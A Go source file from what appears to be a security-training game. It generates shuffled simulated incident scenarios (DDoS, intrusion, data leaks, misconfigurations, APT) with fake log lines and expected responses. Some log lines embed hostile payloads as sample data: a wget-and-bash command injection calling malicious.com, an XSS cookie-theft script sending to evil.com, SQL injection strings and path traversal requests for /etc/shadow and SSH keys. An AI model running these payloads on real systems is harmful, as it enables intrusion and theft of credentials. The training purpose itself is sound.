package repository

import (
	"cyber-skeleton/internal/domain"
	"math/rand"
	"time"
)

type NetworkIncidentGenerator struct {
	rand *rand.Rand
}

func NewNetworkIncidentGenerator() *NetworkIncidentGenerator {
	return &NetworkIncidentGenerator{
		rand: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func (g *NetworkIncidentGenerator) GenerateMany(count int) []domain.NetworkIncident {
	if count <= 0 {
		count = 15
	}

	incidents := []domain.NetworkIncident{}

	// Все типы инцидентов
	allIncidents := []domain.NetworkIncident{
		// ===== DDoS АТАКИ =====
		{
			Type: "ddos_volumetric",
			Logs: []string{
				"[ALERT] Incoming traffic: 15 Gbps (normal: 2 Gbps)",
				"[ALERT] 50,000+ requests/sec from 10,000+ unique IPs",
				"[ERROR] Web server response time: 8500ms (normal: 120ms)",
				"[WARN] DNS amplification attack detected",
				"[INFO] Attack vectors: UDP flood, DNS reflection",
				"[CRITICAL] Service availability: 12%",
			},
			Action: "block",
		},
		{
			Type: "ddos_application",
			Logs: []string{
				"[ALERT] HTTP requests: 100,000/sec (normal: 500/sec)",
				"[WARN] Slowloris attack detected - partial HTTP requests",
				"[ERROR] Application threads exhausted: 2000/2000",
				"[INFO] User-Agent: Mozilla/5.0 (repeating pattern)",
				"[CRITICAL] Database connections: 1000/1000 (maxed out)",
				"[ERROR] Memory usage: 98%",
			},
			Action: "block",
		},
		{
			Type: "ddos_syn_flood",
			Logs: []string{
				"[ALERT] SYN packets: 500,000/sec",
				"[WARN] Half-open connections: 65,000 (normal: 50)",
				"[ERROR] TCP backlog queue full",
				"[INFO] Source IPs: spoofed, randomized",
				"[CRITICAL] New connections rejected",
				"[ALERT] SYN-ACK timeout spike detected",
			},
			Action: "block",
		},
		{
			Type: "ddos_ntp_amplification",
			Logs: []string{
				"[ALERT] NTP response traffic: 20 Gbps",
				"[WARN] NTP monlist command exploited",
				"[INFO] Amplification factor: 556x",
				"[ERROR] Legitimate NTP servers used as reflectors",
				"[CRITICAL] Bandwidth saturation: 95%",
				"[ALERT] 200+ NTP servers sending traffic",
			},
			Action: "block",
		},

		// ===== ПОПЫТКИ ВЗЛОМА =====
		{
			Type: "intrusion_ssh_bruteforce",
			Logs: []string{
				"[ALERT] Failed SSH login attempts: 15,847 in 10 minutes",
				"[WARN] Source IP: 185.220.101.52 (Tor exit node)",
				"[INFO] Target user: root, admin, ubuntu",
				"[WARN] Password attempts: rockyou.txt wordlist detected",
				"[ALERT] Rate: 26 attempts/second",
				"[INFO] Port: 22 (SSH)",
			},
			Action: "block",
		},
		{
			Type: "intrusion_sqli",
			Logs: []string{
				"[ALERT] SQL Injection attempt detected",
				"[WARN] Payload: ' OR '1'='1' -- ",
				"[INFO] Target: /api/users?id=1' UNION SELECT NULL--",
				"[ERROR] WAF blocked 15 similar requests",
				"[CRITICAL] Database credentials exposed in error message",
				"[ALERT] Attacker IP: 45.142.212.87",
			},
			Action: "block",
		},
		{
			Type: "intrusion_rce",
			Logs: []string{
				"[CRITICAL] Remote Code Execution attempt",
				"[ALERT] Payload: ;wget http://malicious.com/shell.sh;bash shell.sh",
				"[WARN] Vulnerable endpoint: /api/upload",
				"[ERROR] File uploaded: reverse_shell.php",
				"[CRITICAL] Outbound connection to 192.0.2.145:4444",
				"[ALERT] Shell commands executed on server",
			},
			Action: "isolate",
		},
		{
			Type: "intrusion_path_traversal",
			Logs: []string{
				"[ALERT] Path Traversal attack detected",
				"[WARN] Request: /download?file=../../../../etc/passwd",
				"[INFO] Multiple attempts: /etc/shadow, /root/.ssh/id_rsa",
				"[ERROR] 23 attempts to access sensitive files",
				"[WARN] Attacker IP: 203.0.113.58",
				"[INFO] WAF rule triggered: LFI/RFI protection",
			},
			Action: "block",
		},
		{
			Type: "intrusion_xss",
			Logs: []string{
				"[ALERT] Cross-Site Scripting (XSS) detected",
				"[WARN] Payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>",
				"[INFO] Injection point: user comment field",
				"[ERROR] 5 users potentially affected",
				"[WARN] Session cookies at risk",
				"[INFO] CSP (Content Security Policy) violation logged",
			},
			Action: "patch",
		},

		// ===== УТЕЧКИ ДАННЫХ =====
		{
			Type: "leak_s3_bucket",
			Logs: []string{
				"[CRITICAL] Public S3 bucket discovered: company-backups-2024",
				"[ALERT] Accessible files: 15,847 documents",
				"[ERROR] Contains: customer_data.csv (2.3M records)",
				"[WARN] No authentication required",
				"[CRITICAL] PII exposed: names, emails, phone numbers",
				"[ALERT] Data indexed by search engines",
			},
			Action: "isolate",
		},
		{
			Type: "leak_database_dump",
			Logs: []string{
				"[CRITICAL] Database dump file found on web server",
				"[ALERT] File: backup_2024_12_18.sql (4.2 GB)",
				"[ERROR] Accessible via: https://example.com/backups/",
				"[WARN] Contains: user credentials (hashed), PII",
				"[CRITICAL] 500,000+ user records exposed",
				"[ALERT] Directory listing enabled",
			},
			Action: "isolate",
		},
		{
			Type: "leak_api_keys",
			Logs: []string{
				"[CRITICAL] API keys hardcoded in GitHub repository",
				"[ALERT] Exposed: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY",
				"[WARN] Repository: public, 1,200 stars",
				"[ERROR] Keys valid and active",
				"[CRITICAL] Potential damage: full AWS account access",
				"[ALERT] Commit: 3 days ago, still not rotated",
			},
			Action: "patch",
		},
		{
			Type: "leak_insider_threat",
			Logs: []string{
				"[ALERT] Unusual data access pattern detected",
				"[WARN] Employee: john.doe@company.com",
				"[INFO] Downloaded: 50,000 customer records (2 GB)",
				"[WARN] Time: 11:47 PM (outside working hours)",
				"[CRITICAL] Data sent to personal email",
				"[ALERT] USB device connected: external hard drive",
			},
			Action: "isolate",
		},
		{
			Type: "leak_ransomware_exfiltration",
			Logs: []string{
				"[CRITICAL] Ransomware detected: LockBit 3.0",
				"[ALERT] Files encrypted: 25,847 files",
				"[WARN] Data exfiltration before encryption: 15 GB uploaded",
				"[ERROR] Destination: 192.0.2.99:443 (Tor hidden service)",
				"[CRITICAL] Ransom note: 50 BTC ($2M) demanded",
				"[ALERT] Threat: data leak on dark web if not paid",
			},
			Action: "isolate",
		},

		// ===== НЕПРАВИЛЬНАЯ КОНФИГУРАЦИЯ =====
		{
			Type: "misconfig_firewall_open",
			Logs: []string{
				"[WARN] Firewall audit: critical issues found",
				"[ERROR] Port 3306 (MySQL) open to 0.0.0.0/0",
				"[ERROR] Port 27017 (MongoDB) accessible from Internet",
				"[WARN] No authentication on Redis (port 6379)",
				"[CRITICAL] RDP port 3389 open to public",
				"[INFO] Recommendation: restrict to internal network only",
			},
			Action: "patch",
		},
		{
			Type: "misconfig_weak_ssl",
			Logs: []string{
				"[ALERT] SSL/TLS vulnerability detected",
				"[WARN] Protocols enabled: SSLv3, TLS 1.0 (deprecated)",
				"[ERROR] Cipher suites: weak ciphers enabled (DES, RC4)",
				"[CRITICAL] Vulnerable to: POODLE, BEAST attacks",
				"[INFO] Certificate: self-signed, expired 30 days ago",
				"[WARN] HSTS not enabled, downgrade attack possible",
			},
			Action: "patch",
		},
		{
			Type: "misconfig_default_credentials",
			Logs: []string{
				"[CRITICAL] Default credentials detected",
				"[ALERT] Service: Jenkins admin panel",
				"[ERROR] Login: admin / Password: admin",
				"[WARN] Accessible from Internet without VPN",
				"[CRITICAL] 50+ jobs with production deployment access",
				"[ALERT] Shodan indexed this service 5 days ago",
			},
			Action: "patch",
		},
		{
			Type: "misconfig_directory_listing",
			Logs: []string{
				"[WARN] Directory listing enabled on web server",
				"[INFO] Exposed paths: /backups/, /logs/, /config/",
				"[ERROR] Sensitive files visible:",
				"[ERROR] - database_credentials.txt",
				"[ERROR] - application.properties (JWT secret exposed)",
				"[WARN] Indexed by Google: 1,200+ files",
			},
			Action: "patch",
		},

		// ===== ПРОДВИНУТЫЕ АТАКИ =====
		{
			Type: "advanced_apt_backdoor",
			Logs: []string{
				"[CRITICAL] Advanced Persistent Threat (APT) detected",
				"[ALERT] Backdoor: China Chopper web shell",
				"[WARN] Installed: 45 days ago (long-term persistence)",
				"[ERROR] C2 server: 198.51.100.88:8443",
				"[CRITICAL] Data exfiltrated: 50 GB over 6 weeks",
				"[ALERT] Techniques: lateral movement, privilege escalation",
			},
			Action: "isolate",
		},
		{
			Type: "advanced_mitm_ssl_strip",
			Logs: []string{
				"[ALERT] Man-in-the-Middle attack detected",
				"[WARN] SSL Strip attack: HTTPS downgraded to HTTP",
				"[ERROR] ARP spoofing: fake gateway at 192.168.1.254",
				"[CRITICAL] Intercepted traffic: 150+ user sessions",
				"[ALERT] Stolen credentials: 23 users",
				"[WARN] Attacker MAC: 00:0c:29:3e:45:a1 (internal network)",
			},
			Action: "isolate",
		},
		{
			Type: "advanced_dns_tunneling",
			Logs: []string{
				"[ALERT] DNS tunneling detected",
				"[WARN] Excessive DNS queries: 50,000/hour",
				"[INFO] Pattern: long subdomains with base64 data",
				"[ERROR] Example: YWRtaW46cGFzc3dvcmQxMjM=.evil.com",
				"[CRITICAL] Data exfiltration via DNS protocol",
				"[ALERT] Bypassing firewall: port 53 allowed",
			},
			Action: "block",
		},
		{
			Type: "advanced_zero_day_exploit",
			Logs: []string{
				"[CRITICAL] Zero-day exploit detected",
				"[ALERT] CVE-2024-XXXXX: Apache Struts RCE",
				"[ERROR] Patch not available yet (0-day)",
				"[WARN] Exploit code: publicly released 2 hours ago",
				"[CRITICAL] 50+ attempts in last 30 minutes",
				"[ALERT] Emergency: isolate affected servers immediately",
			},
			Action: "isolate",
		},

		// ===== FALSE POSITIVES (игнорировать) =====
		{
			Type: "false_positive_scanner",
			Logs: []string{
				"[INFO] Security scanner activity detected",
				"[WARN] Source: Qualys vulnerability scanner (authorized)",
				"[INFO] Scheduled scan: weekly security audit",
				"[INFO] Findings: 15 informational, 3 low severity",
				"[INFO] No actual threats detected",
				"[INFO] Scanner IP: 10.0.5.100 (whitelisted)",
			},
			Action: "ignore",
		},
		{
			Type: "false_positive_backup",
			Logs: []string{
				"[INFO] Large data transfer detected",
				"[WARN] Destination: backup-server.company.local",
				"[INFO] Size: 500 GB",
				"[INFO] Process: automated nightly backup",
				"[INFO] Schedule: every day at 2:00 AM",
				"[INFO] No anomalies detected",
			},
			Action: "ignore",
		},
		{
			Type: "false_positive_monitoring",
			Logs: []string{
				"[INFO] High CPU usage detected: 95%",
				"[WARN] Process: data_processing_job.py",
				"[INFO] Legitimate batch job: monthly report generation",
				"[INFO] Memory: 8 GB allocated (expected)",
				"[INFO] No malicious activity",
				"[INFO] Job completion: estimated 2 hours",
			},
			Action: "ignore",
		},

		// ===== ДОПОЛНИТЕЛЬНЫЕ СЦЕНАРИИ =====
		{
			Type: "intrusion_web_shell",
			Logs: []string{
				"[CRITICAL] Web shell detected on production server",
				"[ALERT] File: /var/www/html/uploads/image.php.jpg",
				"[WARN] Disguised as image file, actually PHP backdoor",
				"[ERROR] Functions: system(), exec(), passthru() enabled",
				"[CRITICAL] Remote access via: http://site.com/uploads/image.php.jpg?cmd=ls",
				"[ALERT] Uploaded 3 hours ago via vulnerable upload form",
			},
			Action: "isolate",
		},
		{
			Type: "malware_cryptominer",
			Logs: []string{
				"[ALERT] Cryptocurrency mining detected",
				"[WARN] Process: xmrig (Monero miner)",
				"[ERROR] CPU usage: 100% on 16 cores",
				"[INFO] Mining pool: pool.supportxmr.com:3333",
				"[CRITICAL] Running for 7 days (electricity cost: $500+)",
				"[ALERT] Installed via: compromised npm package",
			},
			Action: "isolate",
		},
		{
			Type: "privilege_escalation",
			Logs: []string{
				"[CRITICAL] Privilege escalation detected",
				"[ALERT] User 'www-data' gained root access",
				"[WARN] Exploit: CVE-2021-4034 (PwnKit)",
				"[ERROR] SUID binary exploited: /usr/bin/pkexec",
				"[CRITICAL] Root shell spawned",
				"[ALERT] Action: created new admin user 'hacker'",
			},
			Action: "isolate",
		},
		{
			Type: "data_exfiltration_ftp",
			Logs: []string{
				"[ALERT] Suspicious FTP transfer detected",
				"[WARN] Destination: ftp.attacker-server.ru:21",
				"[INFO] Data sent: 25 GB in 2 hours",
				"[ERROR] Files: customer_database.zip, passwords.csv",
				"[CRITICAL] Source: compromised employee workstation",
				"[ALERT] FTP credentials: hardcoded in malware",
			},
			Action: "isolate",
		},
		{
			Type: "lateral_movement_smb",
			Logs: []string{
				"[ALERT] Lateral movement via SMB detected",
				"[WARN] Source: DESKTOP-INFECTED (192.168.1.105)",
				"[INFO] Targets: 15 workstations on local network",
				"[ERROR] Exploit: EternalBlue (MS17-010)",
				"[CRITICAL] Infected machines: 8 so far",
				"[ALERT] Worm-like behavior: self-propagating",
			},
			Action: "isolate",
		},
		{
			Type: "command_and_control_beacon",
			Logs: []string{
				"[CRITICAL] Command & Control (C2) beacon detected",
				"[ALERT] Destination: 198.51.100.77:443 (HTTPS)",
				"[WARN] Beacon interval: every 60 seconds",
				"[INFO] Protocol: Cobalt Strike (commercial malware framework)",
				"[ERROR] Encrypted communication, hard to analyze",
				"[CRITICAL] Persistent: survives reboot via registry key",
			},
			Action: "isolate",
		},
	}

	if count < len(allIncidents) {
		g.rand.Shuffle(len(allIncidents), func(i, j int) {
			allIncidents[i], allIncidents[j] = allIncidents[j], allIncidents[i]
		})
		return allIncidents[:count]
	}

	incidents = allIncidents
	for len(incidents) < count {
		incidents = append(incidents, allIncidents[g.rand.Intn(len(allIncidents))])
	}

	g.rand.Shuffle(len(incidents), func(i, j int) {
		incidents[i], incidents[j] = incidents[j], incidents[i]
	})

	return incidents
}
